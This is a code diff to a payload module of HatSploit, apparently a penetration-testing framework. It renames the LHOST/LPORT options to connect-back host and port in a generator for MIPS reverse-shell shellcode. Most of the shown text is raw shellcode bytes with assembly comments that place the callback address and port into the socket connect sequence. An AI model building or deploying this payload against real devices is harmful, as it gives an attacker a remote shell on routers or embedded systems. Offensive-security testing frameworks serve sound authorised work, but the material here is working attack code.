@@ -29,14 +29,14 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     options = {
-        'LHOST': {
-            'Description': "Local host.",
+        'CBHOST': {
+            'Description': "Connect-back host.",
             'Value': TCPClient.get_local_host(),
             'Type': "ip",
             'Required': True
         },
-        'LPORT': {
-            'Description': "Local port.",
+        'CBPORT': {
+            'Description': "Connect-back port.",
             'Value': 8888,
             'Type': "port",
             'Required': True
@@ -44,12 +44,12 @@ class HatSploitPayload(Payload, HatVenom):
     }
 
     def run(self):
-        local_host, local_port = self.parse_options(self.options)
+        connback_host, connback_port = self.parse_options(self.options)
 
         offsets = {
-            'lport': local_port,
-            'lhost1': self.ip_bytes(local_host)[:2],
-            'lhost2': self.ip_bytes(local_host)[2:]
+            'cbport': connback_port,
+            'cbhost1': self.ip_bytes(connback_host)[:2],
+            'cbhost2': self.ip_bytes(connback_host)[2:]
         }
 
         shellcode = (
@@ -75,10 +75,10 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x24\x02\x0f\xc9"  # li       v0,4041
             b"\x01\x09\x09\x0c"  # syscall  0x42424
             b"\x3c\x05\x00\x02"  # lui      a1,0x2
-            b"\x34\xa5:lport:port:"  # "\x7a\x69"  # ori   a1,a1,0x7a69
+            b"\x34\xa5:cbport:port:"  # "\x7a\x69"  # ori   a1,a1,0x7a69
             b"\xaf\xa5\xff\xf8"  # sw       a1,-8(sp)
-            b"\x3c\x05:lhost1:"  # "\xc0\xa8"  # lui   a1,0xc0a8
-            b"\x34\xa5:lhost2:"  # "\x01\x37"  # ori   a1,a1,0x137
+            b"\x3c\x05:cbhost1:"  # "\xc0\xa8"  # lui   a1,0xc0a8
+            b"\x34\xa5:cbhost2:"  # "\x01\x37"  # ori   a1,a1,0x137
             b"\xaf\xa5\xff\xfc"  # sw       a1,-4(sp)
             b"\x23\xa5\xff\xf8"  # addi     a1,sp,-8
             b"\x24\x0c\xff\xef"  # li       t4,-17
